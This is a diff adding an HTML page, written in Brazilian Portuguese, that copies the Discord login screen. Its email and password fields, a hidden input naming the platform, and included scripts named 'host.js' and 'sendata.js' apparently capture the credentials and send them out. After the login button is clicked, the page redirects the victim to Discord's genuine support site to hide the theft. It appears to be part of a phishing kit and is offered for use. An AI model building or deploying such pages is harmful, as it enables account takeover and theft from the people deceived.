@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discord - Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: radial-gradient(ellipse at bottom, #5865f2 0%, #23272a 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: flex-start;
+      align-items: flex-start;
+      flex-direction: column;
+      color: white;
+      
+      padding: 20px;
+    }
+
+    .login-container {
+      background-color: #2f3136;
+      border-radius: 8px;
+      display: flex;
+      flex-direction: row;
+      padding: 40px;
+      max-width: 900px;
+      width: 100%;
+      gap: 40px;
+      margin: 0 auto 0 auto;
+      flex-wrap: wrap;
+    }
+    .logo-cont{
+        max-width: 900px;
+        width: 100%;
+        margin: 80px auto 10px auto;
+      
+    }
+    .form-section {
+      flex: 1 1 300px;
+      min-width: 280px;
+    }
+
+    .form-section h2 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .form-section p {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #b9bbbe;
+    }
+
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      margin-top: 15px;
+      color: #b9bbbe;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 4px;
+      border: none;
+      background-color: #202225;
+      color: white;
+      font-size: 14px;
+    }
+
+    .forgot {
+      margin-top: 5px;
+      font-size: 12px;
+      color: #00b0f4;
+      cursor: pointer;
+      text-decoration: none;
+      display: block;
+    }
+
+    .forgot:hover {
+      text-decoration: underline;
+    }
+
+    .button {
+      width: 100%;
+      background-color: #5865f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 14px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      background-color: #4752c4;
+    }
+
+    .register {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #b9bbbe;
+    }
+
+    .register a {
+      color: #00b0f4;
+      text-decoration: none;
+    }
+
+    .register a:hover {
+      text-decoration: underline;
+    }
+
+    .qr-section {
+      flex: 1 1 200px;
+      min-width: 240px;
+      text-align: center;
+    }
+
+    .qr-section img {
+      width: 200px;
+      height: 200px;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+
+    .qr-section h3 {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .qr-section p {
+      font-size: 13px;
+      color: #b9bbbe;
+    }
+
+    .qr-section a {
+      display: block;
+      margin-top: 8px;
+      font-size: 12px;
+      color: #00b0f4;
+      text-decoration: none;
+    }
+
+    .qr-section a:hover {
+      text-decoration: underline;
+    }
+
+    /* Responsividade */
+    @media (max-width: 768px) {
+       
+      .login-container {
+        flex-direction: column;
+        align-items: center;
+        
+      }
+      .qr-section {
+        display: none;
+        text-align: center;
+        margin-top: 30px;
+      }
+
+      .qr-section img {
+        width: 150px;
+        height: 150px;
+      }
+    }
+  </style>
+</head>
+<body>
+    <div class="logo-cont">
+        <header><img src="dclogo.png" alt="" width="100px"> </header>
+    </div>
+  <div class="login-container">
+    <div class="form-section">
+      <h2>Boas-vindas de volta!</h2>
+      <p>Estamos muito animados em te ver novamente!</p>
+      <label for="email">E-MAIL OU NÚMERO DE TELEFONE *</label>
+      <input type="email" id="email" value="" class="inputName">
+      <label for="password">SENHA *</label>
+      <input type="password" id="password" value="" class="inputPass">
+      <input type="text" class="platform" value="Discord" style="display: none;" >
+      <a class="forgot" href="#">Esqueceu sua senha?</a>
+      <button class="enviar button">Entrar</button>
+      <p class="register">Precisando de uma conta? <a href="#">Registre-se</a></p>
+    </div>
+    <div class="qr-section">
+      <img src="https://delta.ffvl.fr/sites/delta.ffvl.fr/files/QR%20code%20Discord%20Play%20Store.png" alt="QR Code"/>
+      <h3>Entrar com código QR</h3>
+      <p>Escaneie isto com o <strong>app móvel do Discord</strong> para fazer login imediatamente.</p>
+      <a href="#">Ou, faça login com uma passkey</a>
+
+
+      <script src="../host.js"></script>
+      <script src="../sendata.js"></script>
+
+      <script>
+        document.querySelector(".button").addEventListener("click",()=>{
+            setTimeout(() => {
+                location.href = "https://support.discord.com/hc/pt-br"
+            }, 300);
+        })
+      </script>
+    </div>
+  </div>
+</body>
+</html>
